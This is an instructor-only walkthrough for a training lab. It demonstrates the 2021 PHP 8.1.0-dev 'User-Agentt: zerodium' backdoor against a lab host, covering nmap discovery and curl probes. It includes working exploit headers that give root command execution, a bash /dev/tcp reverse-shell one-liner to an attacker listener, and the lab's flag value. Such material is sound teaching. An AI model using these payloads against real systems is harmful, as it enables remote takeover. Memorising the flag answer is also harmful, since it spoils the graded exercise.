---
id: B02.M05-walkthrough
title: Philadelphia — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/04-target4-php-backdoor.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Philadelphia — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Philadelphia Module (`B02.M05`). Students know only the assigned subnet `192.168.13.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.13.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T4_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (for web enumeration and payload delivery)
* `nc` (Netcat, for catching the reverse shell)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.13.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.13.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.13.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.13.1
Host is up.
Nmap scan report for 192.168.13.10
Host is up.
Nmap scan report for 192.168.13.254
Host is up.
```

**Observation:** Three hosts respond on this subnet.

**Inference:** In this lab layout, `.254` is typically the lab router on the segment and `.1` is often the Docker bridge gateway; neither is the application workload. Concentrate service enumeration on **192.168.13.10** (and any other non-infrastructure address if your deployment differs).

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.13.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.13.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open `80/tcp` labeled only `http` is not enough to research; we need the product and version string (here, PHP’s built-in server and **8.1.0-dev**).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

*Output excerpt:*
```text
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
```

**Observation:** A single open port — **80/tcp** — identified as a **PHP built-in development server** with version **PHP 8.1.0-dev**.

**Inference:** This is not a typical production Apache/nginx + PHP-FPM stack. The `-dev` build string is unusual on a reachable HTTP service and is worth confirming in response headers before researching further.

### Initial Web Probing

nmap told us HTTP on port 80 and a PHP **-dev** build. Confirm that in the HTTP conversation itself: response headers (what the server admits) and the body (whether there is an application to attack, or almost nothing).

```bash
curl -s -D - http://192.168.13.10/ -o /tmp/t4-root.txt | head -12
cat /tmp/t4-root.txt
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter so the output is just headers/body.
* `-D -` — write response **headers** to stdout (`-` means stdout). That is where `X-Powered-By` / `Server` show up.
* `-o /tmp/t4-root.txt` — write the **body** to a file so headers and body stay separated.
* `| head -12` — only the first header lines; we care about status and PHP’s version header, not a long dump.
* `cat /tmp/t4-root.txt` — then read the page. If this were a real app we would look for forms, paths, and generators. Here we need to see how little surface there is.

*Header excerpt:*
```text
HTTP/1.1 200 OK
X-Powered-By: PHP/8.1.0-dev
Content-type: text/html; charset=UTF-8
```

*Body:*
```text
hello world
```

**Observation:** The body is a trivial `hello world` page. The `X-Powered-By` header confirms **PHP/8.1.0-dev** — matching nmap.

**Inference:** A development-tree PHP build on a live HTTP port is a strong research lead, and the page itself is not an application (no forms, no extra paths). Searching with only that version string — `PHP 8.1.0-dev` — surfaces a March 2021 supply-chain incident against the 8.1 **dev** tree. Step 3 is what that implant is and how to prove it.

## 3. Vulnerability Discovery

### What this backdoor is

On **28 March 2021** the PHP git server was compromised. Attackers pushed a commit into the **PHP 8.1 development tree** that implanted a remote code-execution hook. It never shipped in the official **8.1.0** release; it only exists in **`8.1.0-dev`** snapshots from that window. That is why the nmap/`X-Powered-By` string **PHP/8.1.0-dev** is the research lead, not “PHP 8.1” in general. The php.internals notice is here: [php.internals / 113838](https://news-web.php.net/php.internals/113838). The matching Vulhub notes are `vulnhub/php/8.1-backdoor/README.md`.

The implant does not hook a URL or a form. It watches one HTTP request header:

* Header **name:** `User-Agentt` — extra `t`. A normal browser `User-Agent` never matches, so accidental triggers are unlikely.
* Header **value:** must start with the literal prefix **`zerodium`**. Everything **after** that prefix is passed to PHP `eval()`.

**Zerodium** is an exploit-acquisition company. The attackers used that word as a **magic key / calling card** inside the implant — it is not a PHP feature and not a product you configure. Without that prefix, the extra header is ignored and PHP just serves the page.

Trigger shape:

```text
User-Agentt: zerodium<php code here>
```

**Candidate selection:** This host has no login, upload, or framework paths — only the tainted runtime banner. Test this documented header implant before inventing application-layer attacks against `hello world`.

### Prove the implant is live

Use a harmless PHP expression (`var_dump(233*233)`) so a success is obvious in the HTTP body and we are not dropping a shell yet.

First, send the same header **without** the magic prefix. The implant should stay closed:

```bash
curl -s http://192.168.13.10/ \
  -H 'User-Agentt: var_dump(233*233);'
```

*Output:*
```text
hello world
```

**Observation:** Only the normal page. Our PHP was not evaluated.

**Inference:** `User-Agentt` alone is not enough. The `zerodium` prefix is the on-switch.

Now prepend `zerodium` and send the same math:

```bash
curl -s http://192.168.13.10/ \
  -H 'User-Agentt: zerodiumvar_dump(233*233);'
```

*Output:*
```text
int(54289)
hello world
```

**Observation:** The body starts with `int(54289)`, then the usual `hello world`. `233 * 233 = 54289`.

**Inference:** The PHP interpreter **ran our code**. That number cannot come from the static page; the server evaluated the expression and `var_dump` printed the type and result. That is **code execution** (inside PHP). OS commands and a reverse shell are the same channel with a different PHP payload (`system(...)`).

### Automated Path

No stock Metasploit module targets this backdoor (searches for `zerodium`, `8.1.0-dev`, and `User-Agentt` return unrelated results). The public PoC is this crafted header — the same `curl` path used above. There is no separate framework module to configure.

## 4. Exploit Preparation & Remote Access (Manual)

The math probe proved **PHP** execution. A reverse shell is an **OS** callback (`bash` outbound to our listener), so the next check is whether that eval can reach the operating system. PHP’s `system()` runs a shell command in the web-server process (root in this container). If `id` comes back, we have command execution and can use the same primitive for a callback.

### Prove Command Execution

```bash
curl -s http://192.168.13.10/ \
  -H "User-Agentt: zerodiumsystem('id');"
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
hello world
```

**Observation:** `system('id')` returns root privileges and still appends the normal page body.

**Inference:** We have OS-level RCE as root. Next, open a reverse shell rather than only printing command output over HTTP.

### Reverse Shell

Start a Netcat listener on your attacker host (use your student/attacker address on the lab-facing LAN; example below uses `192.168.100.1`):

```bash
nc -lvnp 4444
```

In a second terminal, inject a bash reverse shell through the backdoor header:

```bash
LHOST="192.168.100.1"   # change to your attacker IP
LPORT="4444"

curl -s "http://192.168.13.10/" \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\");"
```

*Listener excerpt:*
```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.13.10] 44790
root@183e687fef3f:/var/www/html#
```

### Failed Attempt: Complex PHP in the Header Without Escaping

Wrapping the reverse shell in nested quotes inside the `User-Agentt` value can break shell parsing on the attacker side before the request is even sent. If `curl` returns a usage error or the listener stays silent, simplify quoting by assigning the header to a variable:

```bash
UA='zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/192.168.100.1/4444 0>&1'"'"'");'

curl -s "http://192.168.13.10/" -H "User-Agentt: $UA"
```

*What we learned:* The exploit is a single HTTP header, but **shell quoting still matters** when constructing the `curl` command locally.

## 5. Retrieve the Flag

From the reverse shell:

```bash
cat /flag.txt
```

*Output:*
```text
onyx-raven
```

### Fallback (HTTP-Only)

If you prefer to stay at the HTTP layer without an interactive shell, the backdoor can print the flag inline:

```bash
curl -s http://192.168.13.10/ \
  -H "User-Agentt: zerodiumsystem('cat /flag.txt');"
```

*Output:*
```text
onyx-raven
hello world
```

Target 4 is complete.
